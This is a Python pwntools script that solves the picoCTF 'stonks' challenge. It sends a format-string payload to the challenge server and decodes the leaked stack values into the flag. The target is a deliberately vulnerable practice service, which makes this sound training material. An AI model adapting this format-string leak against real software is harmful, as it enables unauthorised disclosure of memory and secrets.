# picoCTF-stonks-exploit.py
# by Aidan Wech (ahwech)
# nc mercury.picoctf.net 20195

from pwn import *

def main():
    # connection variables
    server = "mercury.picoctf.net"
    port = 20195

    # variables
    start_flag_pointer = 15                                                              # format string number that contains start of flag
    end_flag_pointer = 25                                                                # format string number that contains end of flag
    
    # setup format string
    payload = b''
    for i in range(start_flag_pointer, end_flag_pointer):
        payload += f"%{i}$p|".encode('utf-8')

    # connect to instance and deliver payload
    p = remote(server, port)
    p.recvuntil(b"io\n", timeout=1)                                             # first menu
    p.sendline(b'1')                                                            # buy stocks
    p.recvuntil(b"?\n", timeout=1)                                              # ask for api token
    p.sendline(payload)                                                         # deliver payload
    p.readline(timeout=1)
    leak = p.readline(timeout=1).rstrip(b'|\n').split(b'|')                     # obtain leaked values as list
    p.recvall(timeout=1)
    p.close()

    # turn hex values into readable string chunks
    flag = ""
    for i in range(end_flag_pointer - start_flag_pointer - 1):
        flag += p32(int(leak[i].decode('utf-8')[2:], 16)).decode('utf-8')
    
    # last chunk only has 1 necessary byte for the flag
    flag += p8(int(leak[len(leak) - 1].decode('utf-8')[8:], 16)).decode('utf-8')

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()